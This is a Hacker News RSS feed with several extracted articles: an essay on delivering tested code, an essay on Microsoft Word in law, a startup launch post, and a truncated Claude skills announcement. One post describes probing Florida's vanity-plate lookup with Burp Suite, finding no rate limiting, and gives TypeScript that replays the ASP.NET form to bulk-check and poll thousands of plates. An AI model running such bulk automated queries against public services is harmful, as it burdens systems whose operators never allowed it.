<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 18 Dec 2025 22:10:26 +0000</lastBuildDate><item><title>Your job is to deliver code you have proven to work</title><link>https://simonwillison.net/2025/Dec/18/code-proven-to-work/</link><description>&lt;doc fingerprint="a640485769051507"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Your job is to deliver code you have proven to work&lt;/head&gt;
    &lt;p&gt;18th December 2025&lt;/p&gt;
    &lt;p&gt;In all of the debates about the value of AI-assistance in software development there’s one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers—or open source maintainers—and expects the “code review” process to handle the rest.&lt;/p&gt;
    &lt;p&gt;This is rude, a waste of other people’s time, and is honestly a dereliction of duty as a software developer.&lt;/p&gt;
    &lt;p&gt;Your job is to deliver code you have proven to work.&lt;/p&gt;
    &lt;p&gt;As software engineers we don’t just crank out code—in fact these days you could argue that’s what the LLMs are for. We need to deliver code that works—and we need to include proof that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.&lt;/p&gt;
    &lt;head rend="h4"&gt;How to prove it works&lt;/head&gt;
    &lt;p&gt;There are two steps to proving a piece of code works. Neither is optional.&lt;/p&gt;
    &lt;p&gt;The first is manual testing. If you haven’t seen the code do the right thing yourself, that code doesn’t work. If it does turn out to work, that’s honestly just pure chance.&lt;/p&gt;
    &lt;p&gt;Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.&lt;/p&gt;
    &lt;p&gt;If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here’s a recent example.&lt;/p&gt;
    &lt;p&gt;Some changes are harder to demonstrate. It’s still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.&lt;/p&gt;
    &lt;p&gt;Once you’ve tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.&lt;/p&gt;
    &lt;p&gt;The second step in proving a change works is automated testing. This is so much easier now that we have LLM tooling, which means there’s no excuse at all for skipping this step.&lt;/p&gt;
    &lt;p&gt;Your contribution should bundle the change with an automated test that proves the change works. That test should fail if you revert the implementation.&lt;/p&gt;
    &lt;p&gt;The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.&lt;/p&gt;
    &lt;p&gt;Don’t be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I’ve done this myself I’ve quickly regretted it.&lt;/p&gt;
    &lt;head rend="h4"&gt;Make your coding agent prove it first&lt;/head&gt;
    &lt;p&gt;The most important trend in LLMs in 2025 has been the explosive growth of coding agents—tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.&lt;/p&gt;
    &lt;p&gt;To master these tools you need to learn how to get them to prove their changes work as well.&lt;/p&gt;
    &lt;p&gt;This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.&lt;/p&gt;
    &lt;p&gt;Since they’re robots, automated tests and manual tests are effectively the same thing.&lt;/p&gt;
    &lt;p&gt;They do feel a little different though. When I’m working on CLI tools I’ll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like Click’s CLIRunner.&lt;/p&gt;
    &lt;p&gt;When working on CSS changes I’ll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.&lt;/p&gt;
    &lt;p&gt;The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They’ll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.&lt;/p&gt;
    &lt;p&gt;Developing good taste in testing code is another of those skills that differentiates a senior engineer.&lt;/p&gt;
    &lt;head rend="h4"&gt;The human provides the accountability&lt;/head&gt;
    &lt;p&gt;A computer can never be held accountable. That’s your job as the human in the loop.&lt;/p&gt;
    &lt;p&gt;Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That’s no longer valuable. What’s valuable is contributing code that is proven to work.&lt;/p&gt;
    &lt;p&gt;Next time you submit a PR, make sure you’ve included your evidence that it works as it should.&lt;/p&gt;
    &lt;head rend="h2"&gt;More recent articles&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Gemini 3 Flash - 17th December 2025&lt;/item&gt;
      &lt;item&gt;I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours - 15th December 2025&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46313297</guid><pubDate>Thu, 18 Dec 2025 14:52:11 +0000</pubDate></item><item><title>Using TypeScript to obtain one of the rarest license plates</title><link>https://www.jack.bio/blog/licenseplate</link><description>&lt;doc fingerprint="90503446b29f284"&gt;
  &lt;main&gt;
    &lt;p&gt;Most people never think twice about the random mix of letters and numbers the DMV assigns them.&lt;/p&gt;
    &lt;p&gt;I'm not one of those people.&lt;/p&gt;
    &lt;p&gt;Online, I've always chased having a clean and memorable digital identity. Over the years, I've been able to pick up handles like my first + last name on Instagram (@jlaf) and full words across platforms (@explain, @discontinue). So when the DMV mailed me my third reminder to renew my registration, that same instinct kicked in: why hadn't I considered getting a distinctive plate combination of my own?&lt;/p&gt;
    &lt;p&gt;In the world of license plates exists a rarity hierarchy:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Single number license plates (10 possible)&lt;/item&gt;
      &lt;item&gt;Repeating number license plates (10 possible)&lt;/item&gt;
      &lt;item&gt;Single letter license plates (26 possible)&lt;/item&gt;
      &lt;item&gt;Repeating letter combinations (??? possible)&lt;/item&gt;
      &lt;item&gt;Two letter plate combinations (676 possible)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;After some research about the history these rare plates, my curiosity got the best of me. How rare could you really go? And how far can you push a state's public lookup tools to find out?&lt;/p&gt;
    &lt;head rend="h2"&gt;PlateRadar &amp;amp; the Monopoly&lt;/head&gt;
    &lt;p&gt;As it stands right now, there's a single resource to find mass information on license plate availability: PlateRadar. PlateRadar, like any smart website, recognizes that this data is definitely worth something to someone - and as a result, hides any information that might be deemed rare behind a 20 dollar a month paywall. The site also refreshes every 24 hours, and from my history with rare usernames I know that time is of the absolute essence when snagging something rare. 24 hours wasn't going to cut it.&lt;/p&gt;
    &lt;p&gt;Unfortunately for PlateRadar, I'm an engineer and not a normal human being, so I decided to dig in on how vanity plates are deemed available or unavailable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Florida's Vanity Plate Checker&lt;/head&gt;
    &lt;p&gt;Florida, unlike some states (!), provides a website that allows you to check a license plate configuration (meaning the custom sequence of letters/numbers that you want printed on your plate) before you waste your time sitting in line at the tax collector's office. The tool also provides the plate types that support that combination, as different plates also allow different character limits (for example, some only permit 5 characters while allow others up to 7 characters).&lt;/p&gt;
    &lt;p&gt;Thankfully, the site had the nifty feature to check more than a single combination at a time, with no additional delay in the request. I was submitting some combinations manually before realizing that I was able to make requests pretty fast manually - so what if I just automated this whole process?&lt;/p&gt;
    &lt;head rend="h3"&gt;The Rate is Limitless&lt;/head&gt;
    &lt;p&gt;I fired up Burp Suite and proxied a request to the service. What came through looked like this:&lt;/p&gt;
    &lt;quote&gt;POST https://services.flhsmv.gov/mvcheckpersonalplate/ HTTP/1.1__VIEWSTATE=/wEPDwULLTE2Nzg2NjE0NDgPZBYCZg9kFgICAw9kFgICAQ9kFgwCBQ8PFgIeBFRleHQFCUFWQUlMQUJMRWRkAgcPDxYCHgdWaXNpYmxlZ2RkAgsPDxYCHwAFASBkZAIRDw8WAh8ABQEgZGQCFw8PFgIfAAUBIGRkAh0PDxYCHwAFASBkZGQZj5Nowpt7uQW4i5K8gYM8k2+WSv9Zz0wpvFKj57zF0w==__VIEWSTATEGENERATOR=0719FE0A__EVENTVALIDATION=/wEdAAlM0TkirL0XIlY9Dw0k/5tSphigSR1TLsx/PgGne7pkToFkrQPgalhmo+FySJy6U4iQeyzYgJga2PpZFeMkYbpKuFA0Lbs4tsi+aCEe29qpNhTkiCU5GKYk9WuPyhuiSM5sZFBTNc+Q1lCok0SfYOt8+CHI2KGhrgOke/DbhB4LDccabLrTZbd0ckqhWOrhQ2MjwxuXnk/njUGbYQbYHdP4Ds+OFyUVKVe45DGbH/0quQ==ctl00$MainContent$txtInputRowOne=MYPLATEctl00$MainContent$txtInputRowTwoctl00$MainContent$txtInputRowThreectl00$MainContent$txtInputRowFourctl00$MainContent$txtInputRowFivectl00$MainContent$btnSubmit=Submit&lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;__VIEWSTATE&lt;/code&gt;, &lt;code&gt;__VIEWSTATEGENERATOR&lt;/code&gt;, and &lt;code&gt;__EVENTVALIDATION&lt;/code&gt; immediately tipped me off that this was an ASP.NET Web Form. Granted, this is a government website, so honestly, what else was I expecting?&lt;/p&gt;
    &lt;p&gt;EVENTVALIDATION is (was?) a novel security measure implemented in 2006 by the ASP.NET team to "prevents unauthorized requests sent by potentially malicious users from the client [..] to ensure that each and every postback and callback event originates from the expected user interface elements, the page adds an extra layer of validation on events".&lt;/p&gt;
    &lt;p&gt;In practice, it's meant to stop forged form submissions, which theoretically sounds like a scraping killer. If I had to fetch a fresh set of these variables before making any form of a request, I'd quickly overwhelm the system with round-trips and get rate-limited almost immediately.&lt;/p&gt;
    &lt;p&gt;... except there was no ratelimiting. At all.&lt;/p&gt;
    &lt;p&gt;See, the website had absolutely zero CAPTCHA, IP ratelimiting, or web application firewall stopping an influx of requests from coming in. I quickly verified this by using Burp Repeater to make a number of null payload requests, which all returned a status code of 200 Successful.&lt;/p&gt;
    &lt;p&gt;Once I realized this, I quickly threw a script together to automate the entire process. The workflow looks something like this:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fetch the page once using real browser headers, which loads the ASP.NET form and gives me &lt;code&gt;__VIEWSTATE&lt;/code&gt;,&lt;code&gt;__VIEWSTATEGENERATOR&lt;/code&gt;and&lt;code&gt;__EVENTVALIDATION&lt;/code&gt;- and the power to make a legitimate POST request.&lt;/item&gt;
      &lt;item&gt;Extract the values from the form using a Regex helper.&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;function extractFormFields(html: string): {viewState: string;viewStateGenerator: string;eventValidation: string;} {const viewStateMatch = html.match(/id="__VIEWSTATE"\s+value="([^"]+)"/);const viewStateGeneratorMatch = html.match(/id="__VIEWSTATEGENERATOR"\s+value="([^"]+)"/);const eventValidationMatch = html.match(/id="__EVENTVALIDATION"\s+value="([^"]+)"/);if (!viewStateMatch || !viewStateGeneratorMatch || !eventValidationMatch) {throw new Error("Failed to extract required form fields from page");}return {viewState: viewStateMatch[1],viewStateGenerator: viewStateGeneratorMatch[1],eventValidation: eventValidationMatch[1],};}&lt;/quote&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Build the POST request with all necessary fields. The actual plate combinations were submitted through &lt;code&gt;ctl00$MainContent$txtInputRowXXX&lt;/code&gt;, where XXX was&lt;code&gt;one&lt;/code&gt;through&lt;code&gt;five&lt;/code&gt;. Using this let me check plate availability 5x faster - and when checking thousands of license plate combinations at a time, it definitely matters.&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;function buildFormData(plates: string[],viewState: string,viewStateGenerator: string,eventValidation: string): string {const params = new URLSearchParams();params.append("__VIEWSTATE", viewState);params.append("__VIEWSTATEGENERATOR", viewStateGenerator);params.append("__EVENTVALIDATION", eventValidation);const fieldNames = ["ctl00$MainContent$txtInputRowOne","ctl00$MainContent$txtInputRowTwo","ctl00$MainContent$txtInputRowThree","ctl00$MainContent$txtInputRowFour","ctl00$MainContent$txtInputRowFive",];for (let i = 0; i &amp;lt; 5; i++) {params.append(fieldNames[i],i &amp;lt; plates.length ? plates[i].toUpperCase() : "");}params.append("ctl00$MainContent$btnSubmit", "Submit");return params.toString();}&lt;/quote&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Submit the POST request and parse the body! Thankfully, the site returned a big ol' &lt;code&gt;AVAILABLE&lt;/code&gt;or&lt;code&gt;NOT AVAILABLE&lt;/code&gt;for each plate combo, so that was easy enough to check in code:&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;function extractPlateStatuses(html: string,plates: string[]): PlateCheckResult[] {const results: PlateCheckResult[] = [];const labelIds = ["MainContent_lblOutPutRowOne","MainContent_lblOutPutRowTwo","MainContent_lblOutputRowThree","MainContent_lblOutputRowFour","MainContent_lblOutputRowFive",];for (let i = 0; i &amp;lt; plates.length; i++) {const labelId = labelIds[i];const regex = new RegExp(`id="${labelId}"[^&amp;gt;]*&amp;gt;([^&amp;lt;]*)&amp;lt;`, "i");const match = html.match(regex);const status = match ? match[1].trim() : "";const available = status.toUpperCase() === "AVAILABLE";results.push({plate: plates[i],available,status: status || "UNKNOWN",});}return results;}&lt;/quote&gt;
    &lt;head rend="h2"&gt;The Plate War of '25&lt;/head&gt;
    &lt;p&gt;Once the script was running smoothly, I created a small microservice that added the results to a Postgres database with the plate combination, along with the last time it was checked. For smaller, high-value combinations (eg, any of the single letter / double letter combinations), I constantly polled every hour or two to check availability. What I didn't realize at the time was the system updated in real time. The moment someone reserved a plate, the Florida DMV's backend reflected the change on the next lookup.&lt;/p&gt;
    &lt;p&gt;To visualize the data I had scraped, I built a quick Next.js frontend that let me browse through results, filter combinations, and batch-upload plate lists from a text file for quick checking.&lt;/p&gt;
    &lt;p&gt;I found some really cool plate combinations, like &lt;code&gt;WEBSITE&lt;/code&gt;, &lt;code&gt;SITE&lt;/code&gt;, and &lt;code&gt;CAPTCHA&lt;/code&gt; . But nothing compared to the spotting one of the only remaining two-letter combination I had seen during my search: &lt;code&gt;EO&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;I saw that &lt;code&gt;EO&lt;/code&gt; was available on November 26th. With Thanksgiving, Black Friday, and the entire weekend shutting down state offices, I assumed I had plenty of time to stroll into the Tax Collector's office and grab it.&lt;/p&gt;
    &lt;p&gt;December 1st rolled around and I hopped in my car at 9:30am to head towards the tax collector's office. While driving, I got a notification from my service that &lt;code&gt;EO&lt;/code&gt; was no longer available. Someone had the same idea as me, and clearly must have arrived when their doors opened right at 8am. I turned the car around, defeated, and went home.&lt;/p&gt;
    &lt;p&gt;When I had gotten home, out of spite (and curiosity) I decided to re-run a full check on all two letter license plates.&lt;/p&gt;
    &lt;p&gt;Just like that, by some weird divine timing alignment, another two-letter combination had popped back into availability.&lt;/p&gt;
    &lt;p&gt;My wallowing quickly ended, and I got right back in my car and drove straight to the office. After almost an hour long wait (and a conversation with a slightly confused but very patient office clerk listening to my explanation), I was able to make the reservation. HY was officially my license plate.&lt;/p&gt;
    &lt;p&gt;I'd show you a picture, but unfortunately Florida runs on a 60-day delivery timeline for custom plates. Still: it exists, it's paid for, and it's proof that with a little TypeScript and an unreasonable amount of determination, you can claim just about anything.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46313379</guid><pubDate>Thu, 18 Dec 2025 15:00:32 +0000</pubDate></item><item><title>The immortality of Microsoft Word</title><link>https://theredline.versionstory.com/p/on-the-immortality-of-microsoft-word</link><description>&lt;doc fingerprint="7034bb295bf46698"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;On the Immortality of Microsoft Word&lt;/head&gt;
    &lt;head rend="h3"&gt;And why tech people refuse to accept it&lt;/head&gt;
    &lt;p&gt;Lawyers and legal tech procurers often feel that vendors don’t ‘get it.’ They don’t understand what lawyers need and they build solutions for problems that lawyers don’t have. A tsunami of venture capital in the space has only amplified this dynamic. If you’ve spent time in r/legaltech in recent months, you’re surely aware of the shared frustration by both lawyers and legal tech procurers that this new crop of legal AI companies have over-promised and under-delivered.&lt;/p&gt;
    &lt;p&gt;Why is it easier for tech people to build machines that emulate human intelligence than it is for them to build software for lawyers that delivers value? As a software engineer who has spent the past five years working in legal tech, I have observed several patterns in products that miss the mark and in my own thinking that I believe explain the disconnect between lawyers and legal tech vendors.&lt;/p&gt;
    &lt;p&gt;My conclusion is that coders misunderstand legal workflows and that their misunderstanding is upstream of many mistakes in legal tech.&lt;/p&gt;
    &lt;p&gt;Of all the mistakes this misunderstanding produces, one stands above the rest—the desire to replace Microsoft Word.&lt;/p&gt;
    &lt;p&gt;Microsoft Word can never be replaced. OpenAI could build superintelligence surpassing human cognition in every conceivable dimension, rendering all human labor obsolete, and Microsoft Word will survive. Future contracts defining the land rights to distant galaxies will undoubtedly be drafted in Microsoft Word.&lt;/p&gt;
    &lt;p&gt;Microsoft Word is immortal.&lt;/p&gt;
    &lt;p&gt;Why?&lt;/p&gt;
    &lt;p&gt;Legal systems around the world run on it. Microsoft Word is the only word processor on the market that meets lawyer’s technical requirements. Furthermore, its file format, docx, is the network protocol that underpins all legal agreements in society. Replacing Microsoft Word is untenable and attempts to do so deeply misunderstand the role that it plays in lawyers’ workflows.&lt;/p&gt;
    &lt;p&gt;The origin of this misunderstanding can be traced to a common myth shared by coders — “The Fall of Legal Tech.”&lt;/p&gt;
    &lt;head rend="h3"&gt;Legal tech’s original sin&lt;/head&gt;
    &lt;p&gt;Throughout history, ancient cultures across the world developed myths about the creation and fall of mankind that mirror one another. So too do coders, drawing from the collective unconscious of the coder hive-mind, invent the myth of “The Fall of Legal Tech”. They mistakenly conclude that Microsoft Word is legal tech’s original sin and only its replacement will lead lawyers to salvation.&lt;/p&gt;
    &lt;p&gt;They have a variety of ideas of what form its successor will take. Some imagine it’s Google Docs. Others believe it will be their product’s proprietary rich text editor. The coders most committed to the ideals of technical elegance, however, propose that Markdown, a computer language for encoding formatted text, shall take its place.&lt;/p&gt;
    &lt;p&gt;Markdown is ubiquitous amongst coders. It allows them to encode document formatting in “plaintext”. Special characters encode its text so that applications can render it with visual formatting. For example, to indicate that text should be italicized, Markdown wraps it in asterisks. E.g. *This text will be italic* -&amp;gt; this text will be italic.&lt;/p&gt;
    &lt;p&gt;Below is an example of a simple Markdown document with its written form on the left and its rendered form on the right.&lt;/p&gt;
    &lt;p&gt;Why do coders want lawyers to use Markdown instead of Microsoft Word? Because Markdown is compatible with git, the version control system that structures their workflow. If lawyers could use git-like version control, so many problems in the legal workflow could be solved. It’s why we’ve spent years building such a system for lawyers. Let’s get into why Markdown is not legal tech’s savior.&lt;/p&gt;
    &lt;head rend="h1"&gt;Formatting&lt;/head&gt;
    &lt;p&gt;Markdown doesn’t work because of formatting. “But Markdown supports formatting!” the coder cries. That is, in fact, its whole point — the raison d’etre of Markdown is to encode formatting in text. Isn’t that enough?&lt;/p&gt;
    &lt;p&gt;Well yes, Markdown supports certain formatting. It supports bold, italics, numbered lists, ordered lists, headings, tables, etc. But what happens when a lawyer wants to style their headings in “small caps”, as my lawyer cofounder Kevin insists? Okay, perhaps we can add that formatting option to Markdown as well. But what happens when a law firm needs their documents to use multi-level decimal clause numbering like in the below screenshot?&lt;/p&gt;
    &lt;p&gt;Or how about when we need to specify the precise width of a column in a table that differs from the width of the other columns or split a particular cell to contain additional rows that other cells don’t?&lt;/p&gt;
    &lt;p&gt;Sure, we could theoretically encode that rule too and all other formatting rules until we’ve accounted for all of the formatting possibilities that lawyers actively use. By that point, however, we will have effectively recreated Microsoft Word but in a format that is significantly more challenging to use.&lt;/p&gt;
    &lt;head rend="h3"&gt;“But style doesn’t matter!”&lt;/head&gt;
    &lt;p&gt;Surely, many coders who have read up until this point are thinking the following objection: why do lawyers need all of those extra formatting options? The styling properties of lists don’t matter – all that matters is the information they convey.&lt;/p&gt;
    &lt;p&gt;Herein lies a cultural difference between the fields of coding and lawyering. For coders, visual aesthetics don’t matter. For lawyers, they are a technical requirement. While this difference may seem arbitrary on the surface, it is downstream of a critical technical difference between the two fields. Machines interpret the work of coders. Human institutions interpret the work of lawyers.&lt;/p&gt;
    &lt;p&gt;Concretely, visual presentation doesn’t matter for code beyond basic legibility because a machine ultimately executes the code. Courts interpret legal contracts, by contrast, and courts often have specific formatting guidelines that Markdown and other non-Word alternatives do not satisfy.&lt;/p&gt;
    &lt;p&gt;For example: federal appellate courts require all “briefs, appendices, and other papers” to adhere to the following formatting conventions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;14-point proportional typeface is mandatory, and Markdown cannot specify font size or font family.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Double-spacing for all text, with narrow exceptions for block quotes and headings. Markdown has no concept of line-spacing rules.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Precise margin requirements (at least one-inch on all sides) and 8.5×11-inch page size, which Markdown cannot express.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Roman-numeral and Arabic page-numbering schemes, footers, and separate formatting for cover pages, none of which Markdown can natively encode.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Additionally, a well-formatted document is a symbol of a lawyer’s professionalism. Courts aren’t the only readers of legal documents. Clients, counterparties, colleagues, all read a lawyer’s documents as well. The style of their work product reflects the lawyer’s professionalism — the medium is the message.&lt;/p&gt;
    &lt;head rend="h1"&gt;Docx is a protocol, not a filetype&lt;/head&gt;
    &lt;p&gt;Beyond styling considerations, another structural consideration of the legal workflow prevents Microsoft Word’s defenestration — the legal system is decentralized.&lt;/p&gt;
    &lt;p&gt;If a coder wants to adopt a new file format for their internal documentation or new programming language, they can rewrite the relevant parts of their codebase. They are able to do so by virtue of having autonomy over the system they operate. While this becomes more complex in an engineering organization, the principle remains that the organization has the necessary autonomy to change its systems.&lt;/p&gt;
    &lt;p&gt;In the legal world, a lawyer cannot simply choose to adopt a new file format. This is because all existing legal precedent is in the old format. Docx encodes virtually every outstanding legal commitment for every person and corporation in our society. A lawyer could choose to adopt a new file format, but the system will break when they need to redline it against precedent.&lt;/p&gt;
    &lt;p&gt;Additionally, every colleague, counterparty, outside-counsel, and client a lawyer ever works with uses docx. To introduce a new format into this ecosystem would introduce friction into every single interaction. If a lawyer sends a contract in Markdown, the counterparty cannot redline it. If they send a link to a proprietary cloud editor, the client cannot file it in their internal document management system. In the legal industry, asking a client to learn a new tool to accommodate your workflow is a non-starter.&lt;/p&gt;
    &lt;p&gt;An appropriate technical analogy for docx is a network protocol. A coder cannot just decide to stop serving their web application over HTTP. Doing so would disconnect their application from the web and render it useless. The same goes for lawyers vis-a-vis docx. Docx is a protocol for defining legal commitments across a decentralized network of legal entities. Opting out of that system is not viable if the lawyer wants to stay in business.&lt;/p&gt;
    &lt;p&gt;This dynamic explains why legal tech products fail when they force lawyers to use a document editor outside of Microsoft Word. They attempt to introduce a walled-garden platform in an industry that runs on an open protocol. When a tech product requires both sides of a transaction to be on the same platform to collaborate effectively, it breaks the protocol. Until a startup can convince the entire global legal market to switch software simultaneously, .docx remains the only viable packet for transferring legal data.&lt;/p&gt;
    &lt;head rend="h1"&gt;How to innovate in legal tech&lt;/head&gt;
    &lt;p&gt;Accepting Microsoft Word’s primacy in the legal workflow is not technological defeatism. Progress shall continue! But impactful innovation in legal tech requires contending with Microsoft Word. Moreover, it requires cultivating a deep understanding of the practice of law beyond a surface-level recognition of the similarities between coders and lawyers.&lt;/p&gt;
    &lt;p&gt;At Version Story, this understanding originates from our lawyer/coder CEO, Kevin O’Connell. His experience in both fields has given us a unique vantage point in the industry, allowing us to understand the legal workflow as it exists while imagining what it can become. That vantage point has been critical in building a version control and redlining product that lawyers love.&lt;/p&gt;
    &lt;p&gt;If more coders and technologists learn the way lawyers actually work, we can expect a future with innovative legal technology that truly adds value. Not revolutions, not ChatGPT wrappers promising to remove lawyering from the practice of law, but meaningful step-changes that help lawyers to spend more time exercising legal judgment and less time wrangling documents.&lt;/p&gt;
    &lt;p&gt;Legal tech never fell. It doesn’t need full-stop salvation. It needs good products built by people who understand lawyers.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46313518</guid><pubDate>Thu, 18 Dec 2025 15:11:06 +0000</pubDate></item><item><title>Launch HN: Pulse (YC S24) – Production-grade unstructured document extraction</title><link>https://news.ycombinator.com/item?id=46313930</link><description>&lt;doc fingerprint="631726296fa45fcb"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN, we’re Sid and Ritvik, co-founders of Pulse (&lt;/p&gt;https://www.runpulse.com/&lt;p&gt;). Pulse is a document extraction system to create LLM-ready text using hybrid VLM + OCR models.&lt;/p&gt;&lt;p&gt;Here’s a demo video: https://video.runpulse.com/video/pulse-platform-walkthrough-....&lt;/p&gt;&lt;p&gt;Later in this post, you’ll find links to before-and-after examples on particularly tricky cases. Check those out to see what Pulse can really do! Modern vision language models are great at producing plausible text, but that makes them risky for OCR and data ingestion. Plausibility isn’t good enough when you need accuracy.&lt;/p&gt;&lt;p&gt;When we started working on document extraction, we assumed the same thing many teams do: foundation models are improving quickly, multi-modal systems appear to read documents well, what’s not to like? And indeed, for small or clean inputs, those assumptions mostly give good results. However, limitations show up once you begin processing real documents in volume. Long PDFs, dense tables, mixed layouts, low-fidelity scans, and financial or operational data expose errors that are subtle, hard to detect, and expensive to correct. Outputs look reasonable even though they contain small but important mistakes, especially in tables and numeric fields.&lt;/p&gt;&lt;p&gt;Running into those challenges got us working. We ran controlled evaluations on complex documents, fine tuned vision models, and built labeled datasets where ground truth actually matters. There have been many nights where our team stayed up hand-annotating pages, drawing bounding boxes around tables, labeling charts point by point, or debating whether a number was unreadable or simply poorly scanned. That process shaped our intuition far more than benchmarks.&lt;/p&gt;&lt;p&gt;One thing became clear quickly. The core challenge is not extraction itself, but confidence. Vision language models embed document images into high-dimensional representations optimized for semantic understanding, not precise transcription. That process is inherently lossy. When uncertainty appears, models tend to resolve it using learned priors instead of surfacing ambiguity. This behavior can be helpful in consumer settings. In production pipelines, it creates verification problems that do not scale well. Pulse grew out of our trying to address this gap through system design rather than prompting alone.&lt;/p&gt;&lt;p&gt;Instead of treating document understanding as a single generative step, our system separates layout analysis from language modeling. Documents are normalized into structured representations that preserve hierarchy and tables before schema mapping occurs. Extraction is constrained by schemas defined ahead of time, and extracted values are tied back to source locations so uncertainty can be inspected rather than guessed away. In practice, this results in a hybrid approach that combines traditional computer vision techniques, layout models, and vision language models, because no single approach handles these cases reliably on its own.&lt;/p&gt;&lt;p&gt;We are intentionally sharing a few documents that reflect the types of inputs that motivated this work. These are representative of cases where we saw generic OCR or VLM-based pipelines struggle.&lt;/p&gt;&lt;p&gt;Here is a financial 10K: https://platform.runpulse.com/dashboard/examples/example1&lt;/p&gt;&lt;p&gt;Here is a newspaper: https://platform.runpulse.com/dashboard/examples/example2&lt;/p&gt;&lt;p&gt;Here is a rent roll: https://platform.runpulse.com/dashboard/examples/example3&lt;/p&gt;&lt;p&gt;Pulse is not perfect, particularly on highly degraded scans or uncommon handwriting, and we’re working on improvements. However, our goal is not to eliminate errors entirely, but to make them visible, auditable, and easier to reason about.&lt;/p&gt;&lt;p&gt;Pulse is available via usage-based access to the API and platform You can sign up to try it at https://platform.runpulse.com/login. API docs are at https://docs.runpulse.com/introduction.&lt;/p&gt;&lt;p&gt;We’d love to hear how others here evaluate correctness for document extraction, which failure modes you have seen in practice, and what signals you rely on to decide whether an output can be trusted.&lt;/p&gt;&lt;p&gt;We will be around to answer questions and are happy to run additional documents if people want to share examples. Put links in the comments and we’ll plug them in and get back to you.&lt;/p&gt;&lt;p&gt;Looking forward to your comments!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46313930</guid><pubDate>Thu, 18 Dec 2025 15:35:52 +0000</pubDate></item><item><title>Beginning January 2026, all ACM publications will be made open access</title><link>https://dl.acm.org/openaccess</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46313991</guid><pubDate>Thu, 18 Dec 2025 15:39:09 +0000</pubDate></item><item><title>Skills for organizations, partners, the ecosystem</title><link>https://claude.com/blog/organization-skills-and-directory</link><description>&lt;doc fingerprint="dd141e2f0b27db6c"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;December 18, 2025&lt;/item&gt;
      &lt;item&gt;5min&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In October, we introduced skillsâa way to teach Claude repeatable workflows tailored to how you work. Today we're making skills easier to deploy, discover, and build: organization-wide management for admins; a directory of partner-built skills from Notion, Canva, Figma, Atlassian, and others; and an open standard so skills work across AI platforms.&lt;/p&gt;
    &lt;head rend="h2"&gt;Manage skills across your organization&lt;/head&gt;
